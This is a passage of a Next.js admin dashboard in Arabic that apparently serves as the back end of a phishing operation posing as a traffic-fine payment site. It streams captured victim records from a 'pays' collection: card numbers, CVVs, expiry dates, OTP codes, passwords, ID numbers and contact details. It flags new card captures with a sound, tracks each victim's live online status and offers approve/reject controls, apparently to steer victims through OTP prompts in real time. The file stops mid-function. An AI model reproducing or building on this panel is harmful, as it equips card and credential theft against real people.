"use client"

import type React from "react"

import { useState, useEffect, useMemo, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  Search,
  Calendar,
  BarChart3,
  Download,
  Settings,
  User,
  Menu,
  ArrowUpDown,
  ChevronLeft,
  ChevronRight,
  AlertCircle,
  Loader2,
  TrendingUp,
  Activity,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref } from "firebase/database"
import { database } from "@/lib/firestore"
import { auth } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { Switch } from "@/components/ui/switch"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Checkbox } from "@/components/ui/checkbox"
import { toast } from "@/hooks/use-toast"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"

// Flag colors for row highlighting
type FlagColor = "red" | "yellow" | "green" | null

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  createdDate: string
  bank: string
  cardStatus?: string
  ip?: string
  cvv: string
  id: string | "0"
  expiryDate: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  cardNumber: string
  country?: string
  personalInfo: {
    id?: string | "0"
    name?: string
  }
  prefix: string
  status: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  pass?: string
  year: string
  month: string
  pagename: string
  plateType: string
  allOtps?: string[] | null
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
  cardExpiry: string
  name: string
  otpCode: string
  phone: string
  flagColor?: FlagColor
}

// Create a separate component for user status that returns both the badge and the status
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <Badge
      variant="outline"
      className={`
        ${
          status === "online"
            ? "bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800"
            : "bg-slate-50 text-slate-600 border-slate-200 dark:bg-slate-950/30 dark:text-slate-400 dark:border-slate-800"
        } transition-all duration-300 font-medium
      `}
    >
      <span
        className={`mr-1.5 inline-block h-2 w-2 rounded-full ${status === "online" ? "bg-emerald-500 animate-pulse" : "bg-slate-400"}`}
      ></span>
      <span className="text-xs font-medium">{status === "online" ? "متصل" : "غير متصل"}</span>
    </Badge>
  )
}

// Create a hook to track online status for a specific user ID
function useUserOnlineStatus(userId: string) {
  const [isOnline, setIsOnline] = useState(false)

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      setIsOnline(data && data.state === "online")
    })

    return () => unsubscribe()
  }, [userId])

  return isOnline
}

// Flag color selector component
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8 hover:bg-slate-100 dark:hover:bg-slate-800">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-amber-500 fill-amber-500"
                  : currentColor === "green"
                    ? "text-emerald-500 fill-emerald-500"
                    : "text-slate-400"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-3 bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 shadow-xl">
        <div className="flex gap-2">
          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-red-50 dark:bg-red-950/30 hover:bg-red-100 dark:hover:bg-red-900/50 border border-red-200 dark:border-red-800"
                  onClick={() => onColorChange(notificationId, "red")}
                >
                  <Flag className="h-4 w-4 text-red-500 fill-red-500" />
                  <span className="sr-only">علم أحمر</span>
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أحمر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-amber-50 dark:bg-amber-950/30 hover:bg-amber-100 dark:hover:bg-amber-900/50 border border-amber-200 dark:border-amber-800"
                  onClick={() => onColorChange(notificationId, "yellow")}
                >
                  <Flag className="h-4 w-4 text-amber-500 fill-amber-500" />
                  <span className="sr-only">علم أصفر</span>
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أصفر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-emerald-50 dark:bg-emerald-950/30 hover:bg-emerald-100 dark:hover:bg-emerald-900/50 border border-emerald-200 dark:border-emerald-800"
                  onClick={() => onColorChange(notificationId, "green")}
                >
                  <Flag className="h-4 w-4 text-emerald-500 fill-emerald-500" />
                  <span className="sr-only">علم أخضر</span>
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أخضر</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-slate-50 dark:bg-slate-800 hover:bg-slate-100 dark:hover:bg-slate-700 border border-slate-200 dark:border-slate-700"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-slate-500" />
                    <span className="sr-only">إزالة العلم</span>
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

// Mini chart component for statistics cards
function MiniChart({ data, color }: { data: number[]; color: string }) {
  const max = Math.max(...data)
  const min = Math.min(...data)
  const range = max - min || 1

  return (
    <div className="flex h-12 items-end gap-1 mt-4">
      {data.map((value, index) => {
        const height = ((value - min) / range) * 100
        return (
          <div
            key={index}
            className={`w-2 rounded-t-sm ${color} opacity-80 hover:opacity-100 transition-opacity`}
            style={{ height: `${Math.max(20, height)}%` }}
          ></div>
        )
      })}
    </div>
  )
}

// Activity Timeline component
function ActivityTimeline({ notifications }: { notifications: Notification[] }) {
  // Get the last 5 notifications
  const recentActivities = notifications.slice(0, 5)

  return (
    <div className="space-y-4">
      {recentActivities.map((notification, index) => (
        <div key={notification.id} className="relative">
          {index !== recentActivities.length - 1 && (
            <div className="absolute top-8 bottom-0 left-4 w-px bg-gradient-to-b from-slate-200 to-transparent dark:from-slate-700"></div>
          )}
          <div className="flex gap-4">
            <div
              className={`mt-1.5 h-8 w-8 rounded-full flex items-center justify-center shadow-sm border-2 ${
                notification.cardNumber
                  ? "bg-emerald-50 text-emerald-600 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-400 dark:border-emerald-800"
                  : "bg-blue-50 text-blue-600 border-blue-200 dark:bg-blue-950/30 dark:text-blue-400 dark:border-blue-800"
              }`}
            >
              {notification.cardNumber ? <CreditCard className="h-4 w-4" /> : <User className="h-4 w-4" />}
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center justify-between">
                <p className="text-sm font-semibold text-slate-900 dark:text-slate-100">
                  {notification.cardNumber ? "معلومات بطاقة جديدة" : "معلومات شخصية جديدة"}
                </p>
                <p className="text-xs text-slate-500 dark:text-slate-400 font-medium">
                  {notification.createdDate &&
                    formatDistanceToNow(new Date(notification.createdDate), {
                      addSuffix: true,
                      locale: ar,
                    })}
                </p>
              </div>
              <p className="text-xs text-slate-600 dark:text-slate-400 mt-1 truncate">
                {notification.country || "غير معروف"} -{" "}
                {notification.name || notification.phone || notification.email || "مستخدم جديد"}
              </p>
              <div className="mt-2 flex gap-2 flex-wrap">
                {notification.cardNumber && (
                  <Badge
                    variant="outline"
                    className="text-xs bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800"
                  >
                    بطاقة
                  </Badge>
                )}
                {notification.otp && (
                  <Badge
                    variant="outline"
                    className="text-xs bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800"
                  >
                    OTP: {notification.otp}
                  </Badge>
                )}
                <UserStatus userId={notification.id} />
              </div>
            </div>
          </div>
        </div>
      ))}

      {recentActivities.length === 0 && (
        <div className="flex flex-col items-center justify-center py-12 text-center">
          <div className="bg-slate-100 dark:bg-slate-800 rounded-full p-4 mb-4">
            <Clock className="h-8 w-8 text-slate-400" />
          </div>
          <p className="text-slate-500 dark:text-slate-400 font-medium">لا توجد أنشطة حديثة</p>
        </div>
      )}
    </div>
  )
}

// Search component
function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
  const [searchTerm, setSearchTerm] = useState("")
  const searchInputRef = useRef<HTMLInputElement>(null)

  const handleSearch = () => {
    onSearch(searchTerm)
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch()
    }
  }

  return (
    <div className="relative">
      <div className="relative">
        <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-slate-400" />
        <Input
          ref={searchInputRef}
          type="search"
          placeholder="بحث عن إشعارات..."
          className="w-full pl-10 pr-4 h-10 bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700 focus:border-blue-500 dark:focus:border-blue-400 focus:ring-blue-500/20 dark:focus:ring-blue-400/20"
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          onKeyDown={handleKeyDown}
        />
      </div>
    </div>
  )
}

// Pagination component
function Pagination({
  currentPage,
  totalPages,
  onPageChange,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
}) {
  return (
    <div className="flex items-center justify-center space-x-2 space-x-reverse">
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(currentPage - 1)}
        disabled={currentPage <= 1}
        className="h-9 w-9 border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
      >
        <ChevronRight className="h-4 w-4" />
        <span className="sr-only">الصفحة السابقة</span>
      </Button>
      <div className="flex items-center gap-1">
        {Array.from({ length: totalPages }, (_, i) => i + 1).map((page) => (
          <Button
            key={page}
            variant={currentPage === page ? "default" : "outline"}
            size="icon"
            className={`h-9 w-9 ${
              currentPage === page
                ? "bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
                : "border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
            }`}
            onClick={() => onPageChange(page)}
          >
            {page}
          </Button>
        ))}
      </div>
      <Button
        variant="outline"
        size="icon"
        onClick={() => onPageChange(currentPage + 1)}
        disabled={currentPage >= totalPages}
        className="h-9 w-9 border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
      >
        <ChevronLeft className="h-4 w-4" />
        <span className="sr-only">الصفحة التالية</span>
      </Button>
    </div>
  )
}

// Settings panel component
function SettingsPanel({
  open,
  onOpenChange,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
}) {
  const [notifyNewCards, setNotifyNewCards] = useState(true)
  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
  const [playSounds, setPlaySounds] = useState(true)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [refreshInterval, setRefreshInterval] = useState("30")

  return (
    <Sheet open={open} onOpenChange={onOpenChange}>
      <SheetContent
        side="left"
        className="sm:max-w-md bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
        dir="rtl"
      >
        <SheetHeader className="border-b border-slate-200 dark:border-slate-700 pb-4">
          <SheetTitle className="flex items-center gap-3 text-xl font-bold text-slate-900 dark:text-slate-100">
            <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
              <Settings className="h-5 w-5 text-blue-600 dark:text-blue-400" />
            </div>
            إعدادات الإشعارات
          </SheetTitle>
        </SheetHeader>
        <div className="mt-6 space-y-8">
          <div className="space-y-4">
            <h3 className="text-sm font-semibold text-slate-900 dark:text-slate-100 flex items-center gap-2">
              <Bell className="h-4 w-4 text-blue-600 dark:text-blue-400" />
              إعدادات الإشعارات
            </h3>
            <div className="space-y-4 bg-slate-50 dark:bg-slate-800/50 rounded-lg p-4">
              <div className="flex items-center justify-between">
                <div className="space-y-1">
                  <Label htmlFor="notify-cards" className="font-medium text-slate-900 dark:text-slate-100">
                    إشعارات البطاقات الجديدة
                  </Label>
                  <p className="text-xs text-slate-600 dark:text-slate-400">تلقي إشعارات عند إضافة بطاقة جديدة</p>
                </div>
                <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-1">
                  <Label htmlFor="notify-users" className="font-medium text-slate-900 dark:text-slate-100">
                    إشعارات المستخدمين الجدد
                  </Label>
                  <p className="text-xs text-slate-600 dark:text-slate-400">تلقي إشعارات عند تسجيل مستخدم جديد</p>
                </div>
                <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
              </div>
              <div className="flex items-center justify-between">
                <div className="space-y-1">
                  <Label htmlFor="play-sounds" className="font-medium text-slate-900 dark:text-slate-100">
                    تشغيل الأصوات
                  </Label>
                  <p className="text-xs text-slate-600 dark:text-slate-400">تشغيل صوت عند استلام إشعار جديد</p>
                </div>
                <Switch id="play-sounds" checked={playSounds} onCheckedChange={setPlaySounds} />
              </div>
            </div>
          </div>

          <Separator className="bg-slate-200 dark:bg-slate-700" />

          <div className="space-y-4">
            <h3 className="text-sm font-semibold text-slate-900 dark:text-slate-100 flex items-center gap-2">
              <Activity className="h-4 w-4 text-emerald-600 dark:text-emerald-400" />
              إعدادات التحديث التلقائي
            </h3>
            <div className="space-y-4 bg-slate-50 dark:bg-slate-800/50 rounded-lg p-4">
              <div className="flex items-center justify-between">
                <div className="space-y-1">
                  <Label htmlFor="auto-refresh" className="font-medium text-slate-900 dark:text-slate-100">
                    تحديث تلقائي
                  </Label>
                  <p className="text-xs text-slate-600 dark:text-slate-400">تحديث البيانات تلقائيًا</p>
                </div>
                <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
              </div>
              {autoRefresh && (
                <div className="space-y-2">
                  <Label htmlFor="refresh-interval" className="font-medium text-slate-900 dark:text-slate-100">
                    فترة التحديث (بالثواني)
                  </Label>
                  <Select value={refreshInterval} onValueChange={setRefreshInterval}>
                    <SelectTrigger
                      id="refresh-interval"
                      className="bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
                    >
                      <SelectValue placeholder="اختر فترة التحديث" />
                    </SelectTrigger>
                    <SelectContent position="popper">
                      <SelectItem value="10">10 ثواني</SelectItem>
                      <SelectItem value="30">30 ثانية</SelectItem>
                      <SelectItem value="60">دقيقة واحدة</SelectItem>
                      <SelectItem value="300">5 دقائق</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}
            </div>
          </div>

          <Separator className="bg-slate-200 dark:bg-slate-700" />

          <div className="space-y-4">
            <h3 className="text-sm font-semibold text-slate-900 dark:text-slate-100 flex items-center gap-2">
              <BarChart3 className="h-4 w-4 text-purple-600 dark:text-purple-400" />
              إعدادات العرض
            </h3>
            <div className="space-y-4 bg-slate-50 dark:bg-slate-800/50 rounded-lg p-4">
              <div className="space-y-2">
                <Label htmlFor="items-per-page" className="font-medium text-slate-900 dark:text-slate-100">
                  عدد العناصر في الصفحة
                </Label>
                <Select defaultValue="10">
                  <SelectTrigger
                    id="items-per-page"
                    className="bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
                  >
                    <SelectValue placeholder="اختر عدد العناصر" />
                  </SelectTrigger>
                  <SelectContent position="popper">
                    <SelectItem value="5">5 عناصر</SelectItem>
                    <SelectItem value="10">10 عناصر</SelectItem>
                    <SelectItem value="20">20 عنصر</SelectItem>
                    <SelectItem value="50">50 عنصر</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div className="space-y-2">
                <Label htmlFor="default-view" className="font-medium text-slate-900 dark:text-slate-100">
                  العرض الافتراضي
                </Label>
                <Select defaultValue="all">
                  <SelectTrigger
                    id="default-view"
                    className="bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
                  >
                    <SelectValue placeholder="اختر العرض الافتراضي" />
                  </SelectTrigger>
                  <SelectContent position="popper">
                    <SelectItem value="all">عرض الكل</SelectItem>
                    <SelectItem value="card">البطاقات</SelectItem>
                    <SelectItem value="online">المتصلين</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>
          </div>

          <div className="flex justify-end gap-3 pt-6 border-t border-slate-200 dark:border-slate-700">
            <Button
              variant="outline"
              onClick={() => onOpenChange(false)}
              className="border-slate-200 dark:border-slate-700"
            >
              إلغاء
            </Button>
            <Button
              onClick={() => {
                toast({
                  title: "تم حفظ الإعدادات",
                  description: "تم حفظ إعدادات الإشعارات بنجاح",
                })
                onOpenChange(false)
              }}
              className="bg-blue-600 hover:bg-blue-700 text-white"
            >
              حفظ الإعدادات
            </Button>
          </div>
        </div>
      </SheetContent>
    </Sheet>
  )
}

// Export dialog component
function ExportDialog({
  open,
  onOpenChange,
  notifications,
}: {
  open: boolean
  onOpenChange: (open: boolean) => void
  notifications: Notification[]
}) {
  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
  const [exportFields, setExportFields] = useState({
    personalInfo: true,
    cardInfo: true,
    status: true,
    timestamps: true,
  })
  const [isExporting, setIsExporting] = useState(false)

  const handleExport = () => {
    setIsExporting(true)

    // Simulate export process
    setTimeout(() => {
      setIsExporting(false)
      onOpenChange(false)
      toast({
        title: "تم التصدير بنجاح",
        description: `تم تصدير ${notifications.length} إشعار بتنسيق ${exportFormat.toUpperCase()}`,
      })
    }, 1500)
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent
        className="sm:max-w-md bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
        dir="rtl"
      >
        <DialogHeader className="border-b border-slate-200 dark:border-slate-700 pb-4">
          <DialogTitle className="flex items-center gap-3 text-xl font-bold text-slate-900 dark:text-slate-100">
            <div className="bg-emerald-100 dark:bg-emerald-900/30 p-2 rounded-lg">
              <Download className="h-5 w-5 text-emerald-600 dark:text-emerald-400" />
            </div>
            تصدير الإشعارات
          </DialogTitle>
        </DialogHeader>
        <div className="space-y-6 py-4">
          <div className="space-y-3">
            <Label className="text-sm font-semibold text-slate-900 dark:text-slate-100">تنسيق التصدير</Label>
            <div className="flex gap-4">
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="csv"
                  value="csv"
                  checked={exportFormat === "csv"}
                  onChange={() => setExportFormat("csv")}
                  className="h-4 w-4 text-blue-600 border-slate-300 focus:ring-blue-500"
                />
                <Label htmlFor="csv" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                  CSV
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <input
                  type="radio"
                  id="json"
                  value="json"
                  checked={exportFormat === "json"}
                  onChange={() => setExportFormat("json")}
                  className="h-4 w-4 text-blue-600 border-slate-300 focus:ring-blue-500"
                />
                <Label htmlFor="json" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                  JSON
                </Label>
              </div>
            </div>
          </div>

          <div className="space-y-3">
            <Label className="text-sm font-semibold text-slate-900 dark:text-slate-100">البيانات المراد تصديرها</Label>
            <div className="space-y-3 bg-slate-50 dark:bg-slate-800/50 rounded-lg p-4">
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="personal-info"
                  checked={exportFields.personalInfo}
                  onCheckedChange={(checked) => setExportFields({ ...exportFields, personalInfo: checked as boolean })}
                />
                <Label
                  htmlFor="personal-info"
                  className="cursor-pointer font-medium text-slate-700 dark:text-slate-300"
                >
                  المعلومات الشخصية
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="card-info"
                  checked={exportFields.cardInfo}
                  onCheckedChange={(checked) => setExportFields({ ...exportFields, cardInfo: checked as boolean })}
                />
                <Label htmlFor="card-info" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                  معلومات البطاقة
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="status"
                  checked={exportFields.status}
                  onCheckedChange={(checked) => setExportFields({ ...exportFields, status: checked as boolean })}
                />
                <Label htmlFor="status" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                  حالة الإشعار
                </Label>
              </div>
              <div className="flex items-center space-x-2 space-x-reverse">
                <Checkbox
                  id="timestamps"
                  checked={exportFields.timestamps}
                  onCheckedChange={(checked) => setExportFields({ ...exportFields, timestamps: checked as boolean })}
                />
                <Label htmlFor="timestamps" className="cursor-pointer font-medium text-slate-700 dark:text-slate-300">
                  الطوابع الزمنية
                </Label>
              </div>
            </div>
          </div>

          <div className="rounded-lg bg-blue-50 dark:bg-blue-950/30 p-4 border border-blue-200 dark:border-blue-800">
            <div className="flex items-center gap-3 text-sm">
              <AlertCircle className="h-5 w-5 text-blue-600 dark:text-blue-400 flex-shrink-0" />
              <p className="text-blue-800 dark:text-blue-300 font-medium">
                سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.
              </p>
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start border-t border-slate-200 dark:border-slate-700 pt-4">
          <Button
            variant="outline"
            onClick={() => onOpenChange(false)}
            className="border-slate-200 dark:border-slate-700"
          >
            إلغاء
          </Button>
          <Button
            type="submit"
            onClick={handleExport}
            disabled={isExporting}
            className="bg-emerald-600 hover:bg-emerald-700 text-white"
          >
            {isExporting ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                جاري التصدير...
              </>
            ) : (
              <>
                <Download className="mr-2 h-4 w-4" />
                تصدير
              </>
            )}
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(10)
  const [settingsOpen, setSettingsOpen] = useState(false)
  const [exportDialogOpen, setExportDialogOpen] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })

      statusRefs[notification.id] = callback
    })

    // Cleanup function
    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  // Filter and search notifications
  const filteredNotifications = useMemo(() => {
    let filtered = notifications

    // Apply filter type
    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.cardNumber)
    } else if (filterType === "online") {
      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
    }

    // Apply search term
    if (searchTerm) {
      const term = searchTerm.toLowerCase()
      filtered = filtered.filter(
        (notification) =>
          notification.name?.toLowerCase().includes(term) ||
          notification.email?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.otp?.toLowerCase().includes(term),
      )
    }

    return filtered
  }, [filterType, notifications, onlineStatuses, searchTerm])

  // Paginate notifications
  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredNotifications, currentPage, itemsPerPage])

  // Calculate total pages
  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))

  // Reset to first page when filter or search changes
  useEffect(() => {
    setCurrentPage(1)
  }, [filterType, searchTerm])

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.email || notification?.phone) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n?.phone)),
        )

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      toast({
        title: "تم مسح جميع الإشعارات",
        description: "تم مسح جميع الإشعارات بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعارات",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
      })
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleLogout = async () => {
    try {
